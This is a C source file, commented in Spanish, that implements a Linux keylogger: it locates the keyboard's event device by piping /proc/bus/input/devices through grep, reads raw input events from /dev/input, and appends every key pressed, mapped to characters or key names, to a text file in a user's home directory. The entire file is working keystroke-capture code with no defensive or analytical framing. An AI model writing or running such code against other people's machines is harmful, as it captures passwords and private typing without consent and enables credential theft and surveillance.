#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/sofia/keylogger/keylogger.txt"

char *getEvent();

int main(){
  struct input_event ev;
  // ruta al directorio de inputs
  static char path_keyboard[20] = "/dev/input/";
  // concatenar variable keyboard
  strcat(path_keyboard, getEvent());
  // eliminar último caracter (breakline)
  path_keyboard[strlen(path_keyboard)-1] = 0;
  // leer ruta a input
  int device_keyboard = open(path_keyboard, O_RDONLY);
  // imprimir error
  if (errno > 0) {
    printf("Error: %d\n", errno);
  }
  // abrir fichero de logs
  FILE *fp = fopen(LOGFILEPATH, "a");
  while (1) {
    read(device_keyboard, &ev, sizeof(ev));
    if (ev.type == EV_KEY && ev.value == 0) {
    	fprintf(fp, " ");
    	if (ev.code == KEY_ESC) {
    	    fputs("ESC", fp);
	} else if (ev.code == KEY_1) {
	    fputc('1', fp);
	} else if (ev.code == KEY_2) {
	    fputc('2', fp);
	} else if (ev.code == KEY_3) {
	    fputc('3', fp);
	} else if (ev.code == KEY_4) {
	    fputc('4', fp);
	} else if (ev.code == KEY_5) {
	    fputc('5', fp);
	} else if (ev.code == KEY_6) {
	    fputc('6', fp);
	} else if (ev.code == KEY_7) {
	    fputc('7', fp);
	} else if (ev.code == KEY_8) {
	    fputc('8', fp);
	} else if (ev.code == KEY_9) {
	    fputc('9', fp);
	} else if (ev.code == KEY_0) {
	    fputc('0', fp);
	} else if (ev.code == KEY_MINUS) {
	    fputc('-', fp);
	} else if (ev.code == KEY_EQUAL) {
	    fputc('=', fp);
	} else if (ev.code == KEY_BACKSPACE) {
	    fputs("BACKSPACE", fp);
	} else if (ev.code == KEY_TAB) {
	    fputs("TAB", fp);
	} else if (ev.code == KEY_Q) {
	    fputc('Q', fp);
	} else if (ev.code == KEY_W) {
	    fputc('W', fp);
	} else if (ev.code == KEY_E) {
	    fputc('E', fp);
	} else if (ev.code == KEY_R) {
	    fputc('R', fp);
	} else if (ev.code == KEY_T) {
	    fputc('T', fp);
	} else if (ev.code == KEY_Y) {
	    fputc('Y', fp);
	} else if (ev.code == KEY_U) {
	    fputc('U', fp);
	} else if (ev.code == KEY_I) {
	    fputc('I', fp);
	} else if (ev.code == KEY_O) {
	    fputc('O', fp);
	} else if (ev.code == KEY_P) {
	    fputc('P', fp);
	} else if (ev.code == KEY_LEFTBRACE) {
	    fputc('[', fp);
	} else if (ev.code == KEY_RIGHTBRACE) {
	    fputc(']', fp);
	} else if (ev.code == KEY_ENTER) {
	    fputs("ENTER", fp);
	} else if (ev.code == KEY_LEFTCTRL) {
	    fputs("LEFTCTRL", fp);
	} else if (ev.code == KEY_A) {
	    fputc('A', fp);
	} else if (ev.code == KEY_S) {
	    fputc('S', fp);
	} else if (ev.code == KEY_D) {
	    fputc('D', fp);
	} else if (ev.code == KEY_F) {
	    fputc('F', fp);
	} else if (ev.code == KEY_G) {
	    fputc('G', fp);
	} else if (ev.code == KEY_H) {
	    fputc('H', fp);
	} else if (ev.code == KEY_J) {
	    fputc('J', fp);
	} else if (ev.code == KEY_K) {
	    fputc('K', fp);
	} else if (ev.code == KEY_L) {
	    fputc('L', fp);
	} else if (ev.code == KEY_SEMICOLON) {
	    fputc(';', fp);
	} else if (ev.code == KEY_APOSTROPHE) {
	    fputc('\'', fp);
	} else if (ev.code == KEY_GRAVE) {
	    fputc('`', fp);
	} else if (ev.code == KEY_LEFTSHIFT) {
	    fputs("LEFTSHIFT", fp);
	} else if (ev.code == KEY_BACKSLASH) {
	    fputc('\\', fp);
	} else if (ev.code == KEY_Z) {
	    fputc('Z', fp);
	} else if (ev.code == KEY_X) {
	    fputc('X', fp);
	} else if (ev.code == KEY_C) {
	    fputc('C', fp);
	} else if (ev.code == KEY_V) {
	    fputc('V', fp);
	} else if (ev.code == KEY_B) {
	    fputc('B', fp);
	} else if (ev.code == KEY_N) {
	    fputc('N', fp);
	} else if (ev.code == KEY_M) {
	    fputc('M', fp);
	} else if (ev.code == KEY_COMMA) {
	    fputc(',', fp);
	} else if (ev.code == KEY_DOT) {
	    fputc('.', fp);
	} else if (ev.code == KEY_SLASH) {
	    fputc('/', fp);
	} else if (ev.code == KEY_RIGHTSHIFT) {
	    fputs("RIGHTSHIFT", fp);
	} else if (ev.code == KEY_KPASTERISK) {
	    fputc('*', fp);
	} else if (ev.code == KEY_LEFTALT) {
	    fputs("LEFTALT", fp);
	} else if (ev.code == KEY_SPACE) {
	    fputc(' ', fp);
	} else if (ev.code == KEY_CAPSLOCK) {
	    fputs("CAPSLOCK", fp);
	} else if (ev.code == KEY_F1) {
	    fputs("F1", fp);
	} else if (ev.code == KEY_F2) {
	    fputs("F2", fp);
	} else if (ev.code == KEY_F3) {
	    fputs("F3", fp);
	} else if (ev.code == KEY_F4) {
	    fputs("F4", fp);
	} else if (ev.code == KEY_F5) {
	    fputs("F5", fp);
	} else if (ev.code == KEY_F6) {
	    fputs("F6", fp);
	} else if (ev.code == KEY_F7) {
	    fputs("F7", fp);
	} else if (ev.code == KEY_F8) {
	    fputs("F8", fp);
	} else if (ev.code == KEY_F9) {
	    fputs("F9", fp);
	} else if (ev.code == KEY_F10) {
	    fputs("F10", fp);
	} else if (ev.code == KEY_NUMLOCK) {
	    fputs("NUMLOCK", fp);
	} else if (ev.code == KEY_SCROLLLOCK) {
	    fputs("SCROLLLOCK", fp);
	} else if (ev.code == KEY_KP7) {
	    fputc('7', fp);
	} else if (ev.code == KEY_KP8) {
	    fputc('8', fp);
	} else if (ev.code == KEY_KP9) {
	    fputc('9', fp);
	} else if (ev.code == KEY_KPMINUS) {
	    fputc('-', fp);
	} else if (ev.code == KEY_KP4) {
	    fputc('4', fp);
	} else if (ev.code == KEY_KP5) {
	    fputc('5', fp);
	} else if (ev.code == KEY_KP6) {
	    fputc('6', fp);
	} else if (ev.code == KEY_KPPLUS) {
	    fputc('+', fp);
	} else if (ev.code == KEY_KP1) {
	    fputc('1', fp);
	} else if (ev.code == KEY_KP2) {
	    fputc('2', fp);
	} else if (ev.code == KEY_KP3) {
	    fputc('3', fp);
	} else if (ev.code == KEY_KP0) {
	    fputc('0', fp);
	} else if (ev.code == KEY_KPDOT) {
	    fputc('.', fp);
	} else if (ev.code == KEY_ZENKAKUHANKAKU) {
	    fputs("ZENKAKUHANKAKU", fp);
	} else if (ev.code == KEY_102ND) {
	    fputs("102ND", fp);
	} else if (ev.code == KEY_F11) {
	    fputs("F11", fp);
	} else if (ev.code == KEY_F12) {
	    fputs("F12", fp);
	} else if (ev.code == KEY_RO) {
	    fputs("RO", fp);
	} else if (ev.code == KEY_KATAKANA) {
	    fputs("KATAKANA", fp);
	} else if (ev.code == KEY_HIRAGANA) {
	    fputs("HIRAGANA", fp);
	} else if (ev.code == KEY_HENKAN) {
	    fputs("HENKAN", fp);
	} else if (ev.code == KEY_KATAKANAHIRAGANA) {
	    fputs("KATAKANAHIRAGANA", fp);
	} else if (ev.code == KEY_MUHENKAN) {
	    fputs("MUHENKAN", fp);
	} else if (ev.code == KEY_KPJPCOMMA) {
	    fputc(',', fp);
	} else if (ev.code == KEY_KPENTER) {
	    fputs("KPENTER", fp);
	} else if (ev.code == KEY_RIGHTCTRL) {
	    fputs("RIGHTCTRL", fp);
	} else if (ev.code == KEY_KPSLASH) {
	    fputc('/', fp);
	} else if (ev.code == KEY_SYSRQ) {
	    fputs("SYSRQ", fp);
	} else if (ev.code == KEY_RIGHTALT) {
	    fputs("RIGHTALT", fp);
	} else if (ev.code == KEY_LINEFEED) {
	    fputs("LINEFEED", fp);
	} else if (ev.code == KEY_HOME) {
	    fputs("HOME", fp);
	} else if (ev.code == KEY_UP) {
	    fputs("UP", fp);
	} else if (ev.code == KEY_PAGEUP) {
	    fputs("PAGEUP", fp);
	} else if (ev.code == KEY_LEFT) {
	    fputs("LEFT", fp);
	} else if (ev.code == KEY_RIGHT) {
	    fputs("RIGHT", fp);
	} else if (ev.code == KEY_END) {
	    fputs("END", fp);
	} else if (ev.code == KEY_DOWN) {
	    fputs("DOWN", fp);
	} else if (ev.code == KEY_PAGEDOWN) {
	    fputs("PAGEDOWN", fp);
	} else if (ev.code == KEY_INSERT) {
	    fputs("INSERT", fp);
	} else if (ev.code == KEY_DELETE) {
	    fputs("DELETE", fp);
	} else if (ev.code == KEY_MACRO) {
	    fputs("MACRO", fp);
	} else if (ev.code == KEY_MUTE) {
	    fputs("MUTE", fp);
	} else if (ev.code == KEY_VOLUMEDOWN) {
	    fputs("VOLUMEDOWN", fp);
	} else if (ev.code == KEY_VOLUMEUP) {
	    fputs("VOLUMEUP", fp);
	} else if (ev.code == KEY_POWER) {
	    fputs("POWER", fp);
	} else if (ev.code == KEY_KPEQUAL) {
	    fputc('=', fp);
	} else if (ev.code == KEY_KPPLUSMINUS) {
	    fputs("KPPLUSMINUS", fp);
	} else if (ev.code == KEY_PAUSE) {
	    fputs("PAUSE", fp);
	} else if (ev.code == KEY_SCALE) {
	    fputs("SCALE", fp);
	} else if (ev.code == KEY_KPCOMMA) {
	    fputc(',', fp);
	} else if (ev.code == KEY_HANGEUL) {
	    fputs("HANGEUL", fp);
	} else if (ev.code == KEY_HANJA) {
	    fputs("HANJA", fp);
	} else if (ev.code == KEY_YEN) {
	    fputs("YEN", fp);
	} else if (ev.code == KEY_LEFTMETA) {
	    fputs("LEFTMETA", fp);
	} else if (ev.code == KEY_RIGHTMETA) {
	    fputs("RIGHTMETA", fp);
	} else if (ev.code == KEY_COMPOSE) {
	    fputs("COMPOSE", fp);
	} else if (ev.code == KEY_STOP) {
	    fputs("STOP", fp);
	} else if (ev.code == KEY_AGAIN) {
	    fputs("AGAIN", fp);
	} else if (ev.code == KEY_PROPS) {
	    fputs("PROPS", fp);
	} else if (ev.code == KEY_UNDO) {
	    fputs("UNDO", fp);
	} else if (ev.code == KEY_FRONT) {
	    fputs("FRONT", fp);
	} else if (ev.code == KEY_COPY) {
	    fputs("COPY", fp);
	} else if (ev.code == KEY_OPEN) {
	    fputs("OPEN", fp);
	} else if (ev.code == KEY_PASTE) {
	    fputs("PASTE", fp);
	} else if (ev.code == KEY_FIND) {
	    fputs("FIND", fp);
	} else if (ev.code == KEY_CUT) {
	    fputs("CUT", fp);
	} else if (ev.code == KEY_HELP) {
	    fputs("HELP", fp);
	} else if (ev.code == KEY_MENU) {
	    fputs("MENU", fp);
	} else if (ev.code == KEY_CALC) {
	    fputs("CALC", fp);
	} else if (ev.code == KEY_SETUP) {
	    fputs("SETUP", fp);
	} else if (ev.code == KEY_SLEEP) {
	    fputs("SLEEP", fp);
	} else if (ev.code == KEY_WAKEUP) {
	    fputs("WAKEUP", fp);
	} else if (ev.code == KEY_FILE) {
	    fputs("FILE", fp);
	} else if (ev.code == KEY_SENDFILE) {
	    fputs("SENDFILE", fp);
	} else if (ev.code == KEY_DELETEFILE) {
	    fputs("DELETEFILE", fp);
	} else if (ev.code == KEY_XFER) {
	    fputs("XFER", fp);
	} else if (ev.code == KEY_PROG1) {
	    fputs("PROG1", fp);
	} else if (ev.code == KEY_PROG2) {
	    fputs("PROG2", fp);
	} else if (ev.code == KEY_WWW) {
	    fputs("WWW", fp);
	} else if (ev.code == KEY_MSDOS) {
	    fputs("MSDOS", fp);
	} else if (ev.code == KEY_COFFEE) {
	    fputs("COFFEE", fp);
	} else if (ev.code == KEY_ROTATE_DISPLAY) {
	    fputs("ROTATE_DISPLAY", fp);
	} else if (ev.code == KEY_CYCLEWINDOWS) {
	    fputs("CYCLEWINDOWS", fp);
	} else if (ev.code == KEY_MAIL) {
	    fputs("MAIL", fp);
	} else if (ev.code == KEY_BOOKMARKS) {
	    fputs("BOOKMARKS", fp);
	} else if (ev.code == KEY_COMPUTER) {
	    fputs("COMPUTER", fp);
	} else if (ev.code == KEY_BACK) {
	    fputs("BACK", fp);
	} else if (ev.code == KEY_FORWARD) {
	    fputs("FORWARD", fp);
	} else if (ev.code == KEY_CLOSECD) {
	    fputs("CLOSECD", fp);
	} else if (ev.code == KEY_EJECTCD) {
	    fputs("EJECTCD", fp);
	} else if (ev.code == KEY_EJECTCLOSECD) {
	    fputs("EJECTCLOSECD", fp);
	} else if (ev.code == KEY_NEXTSONG) {
	    fputs("NEXTSONG", fp);
	} else if (ev.code == KEY_PLAYPAUSE) {
	    fputs("PLAYPAUSE", fp);
	} else if (ev.code == KEY_PREVIOUSSONG) {
	    fputs("PREVIOUSSONG", fp);
	} else if (ev.code == KEY_STOPCD) {
	    fputs("STOPCD", fp);
	} else if (ev.code == KEY_RECORD) {
	    fputs("RECORD", fp);
	} else if (ev.code == KEY_REWIND) {
	    fputs("REWIND", fp);
	} else if (ev.code == KEY_PHONE) {
	    fputs("PHONE", fp);
	} else if (ev.code == KEY_ISO) {
	    fputs("ISO", fp);
	} else if (ev.code == KEY_CONFIG) {
	    fputs("CONFIG", fp);
	} else if (ev.code == KEY_HOMEPAGE) {
	    fputs("HOMEPAGE", fp);
	} else if (ev.code == KEY_REFRESH) {
	    fputs("REFRESH", fp);
	} else if (ev.code == KEY_EXIT) {
	    fputs("EXIT", fp);
	} else if (ev.code == KEY_MOVE) {
	    fputs("MOVE", fp);
	} else if (ev.code == KEY_EDIT) {
	    fputs("EDIT", fp);
	} else if (ev.code == KEY_SCROLLUP) {
	    fputs("SCROLLUP", fp);
	} else if (ev.code == KEY_SCROLLDOWN) {
	    fputs("SCROLLDOWN", fp);
	} else if (ev.code == KEY_KPLEFTPAREN) {
	    fputc('(', fp);
	} else if (ev.code == KEY_KPRIGHTPAREN) {
	    fputc(')', fp);
	} else if (ev.code == KEY_NEW) {
	    fputs("NEW", fp);
	} else if (ev.code == KEY_REDO) {
	    fputs("REDO", fp);
	} else if (ev.code == KEY_F13) {
	    fputs("F13", fp);
	} else if (ev.code == KEY_F14) {
	    fputs("F14", fp);
	} else if (ev.code == KEY_F15) {
	    fputs("F15", fp);
	} else if (ev.code == KEY_F16) {
	    fputs("F16", fp);
	} else if (ev.code == KEY_F17) {
	    fputs("F17", fp);
	} else if (ev.code == KEY_F18) {
	    fputs("F18", fp);
	} else if (ev.code == KEY_F19) {
	    fputs("F19", fp);
	} else if (ev.code == KEY_F20) {
	    fputs("F20", fp);
	} else if (ev.code == KEY_F21) {
	    fputs("F21", fp);
	} else if (ev.code == KEY_F22) {
	    fputs("F22", fp);
	} else if (ev.code == KEY_F23) {
	    fputs("F23", fp);
	} else if (ev.code == KEY_F24) {
	    fputs("F24", fp);
	} else if (ev.code == KEY_PLAYCD) {
	    fputs("PLAYCD", fp);
	} else if (ev.code == KEY_PAUSECD) {
	    fputs("PAUSECD", fp);
	} else if (ev.code == KEY_PROG3) {
	    fputs("PROG3", fp);
	} else if (ev.code == KEY_PROG4) {
	    fputs("PROG4", fp);
	} else if (ev.code == KEY_ALL_APPLICATIONS) {
	    fputs("ALL_APPLICATIONS", fp);
	} else if (ev.code == KEY_SUSPEND) {
	    fputs("SUSPEND", fp);
	} else if (ev.code == KEY_CLOSE) {
	    fputs("CLOSE", fp);
	} else if (ev.code == KEY_PLAY) {
	    fputs("PLAY", fp);
	} else if (ev.code == KEY_FASTFORWARD) {
	    fputs("FASTFORWARD", fp);
	} else if (ev.code == KEY_BASSBOOST) {
	    fputs("BASSBOOST", fp);
	} else if (ev.code == KEY_PRINT) {
	    fputs("PRINT", fp);
	} else if (ev.code == KEY_HP) {
	    fputs("HP", fp);
	} else if (ev.code == KEY_CAMERA) {
	    fputs("CAMERA", fp);
	} else if (ev.code == KEY_SOUND) {
	    fputs("SOUND", fp);
	} else if (ev.code == KEY_QUESTION) {
	    fputs("QUESTION", fp);
	} else if (ev.code == KEY_EMAIL) {
	    fputs("EMAIL", fp);
	} else if (ev.code == KEY_CHAT) {
	    fputs("CHAT", fp);
	} else if (ev.code == KEY_SEARCH) {
	    fputs("SEARCH", fp);
	} else if (ev.code == KEY_CONNECT) {
	    fputs("CONNECT", fp);
	} else if (ev.code == KEY_FINANCE) {
	    fputs("FINANCE", fp);
	} else if (ev.code == KEY_SPORT) {
	    fputs("SPORT", fp);
	} else if (ev.code == KEY_SHOP) {
	    fputs("SHOP", fp);
	} else if (ev.code == KEY_ALTERASE) {
	    fputs("ALTERASE", fp);
	} else if (ev.code == KEY_CANCEL) {
	    fputs("CANCEL", fp);
	} else if (ev.code == KEY_BRIGHTNESSDOWN) {
	    fputs("BRIGHTNESSDOWN", fp);
	} else if (ev.code == KEY_BRIGHTNESSUP) {
	    fputs("BRIGHTNESSUP", fp);
	} else if (ev.code == KEY_MEDIA) {
	    fputs("MEDIA", fp);
	} else if (ev.code == KEY_SWITCHVIDEOMODE) {
	    fputs("SWITCHVIDEOMODE", fp);
	} else if (ev.code == KEY_KBDILLUMTOGGLE) {
	    fputs("KBDILLUMTOGGLE", fp);
	} else if (ev.code == KEY_KBDILLUMDOWN) {
	    fputs("KBDILLUMDOWN", fp);
	} else if (ev.code == KEY_KBDILLUMUP) {
	    fputs("KBDILLUMUP", fp);
	} else if (ev.code == KEY_SEND) {
	    fputs("SEND", fp);
	} else if (ev.code == KEY_REPLY) {
	    fputs("REPLY", fp);
	} else if (ev.code == KEY_FORWARDMAIL) {
	    fputs("FORWARDMAIL", fp);
	} else if (ev.code == KEY_SAVE) {
	    fputs("SAVE", fp);
	} else if (ev.code == KEY_DOCUMENTS) {
	    fputs("DOCUMENTS", fp);
	} else if (ev.code == KEY_BATTERY) {
	    fputs("BATTERY", fp);
	} else if (ev.code == KEY_BLUETOOTH) {
	    fputs("BLUETOOTH", fp);
	} else if (ev.code == KEY_WLAN) {
	    fputs("WLAN", fp);
	} else if (ev.code == KEY_UWB) {
	    fputs("UWB", fp);
	} else if (ev.code == KEY_UNKNOWN) {
	    fputs("UNKNOWN", fp);
	} else if (ev.code == KEY_VIDEO_NEXT) {
	    fputs("VIDEO_NEXT", fp);
	} else if (ev.code == KEY_VIDEO_PREV) {
	    fputs("VIDEO_PREV", fp);
	} else if (ev.code == KEY_BRIGHTNESS_CYCLE) {
	    fputs("BRIGHTNESS_CYCLE", fp);
	} else if (ev.code == KEY_BRIGHTNESS_AUTO) {
	    fputs("BRIGHTNESS_AUTO", fp);
	} else if (ev.code == KEY_DISPLAY_OFF) {
	    fputs("DISPLAY_OFF", fp);
	} else if (ev.code == KEY_WWAN) {
	    fputs("WWAN", fp);
	} else if (ev.code == KEY_RFKILL) {
	    fputs("RFKILL", fp);
	} else if (ev.code == KEY_MICMUTE) {
	    fputs("MICMUTE", fp);
	}
     	fflush(fp);
    }
  }
}

char *getEvent(){
  // leer el fichero devices y extraer el input que se refiera al teclado
  char *command =  (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
  static char event[8];
  FILE *pipe = popen(command, "r");
  if (!pipe)
    exit(1);
  // obtener la cadena de texto del evento correspondiente al teclado
  fgets(event, 8, pipe);
  pclose(pipe);
  // retornar el evento
  return event;
}
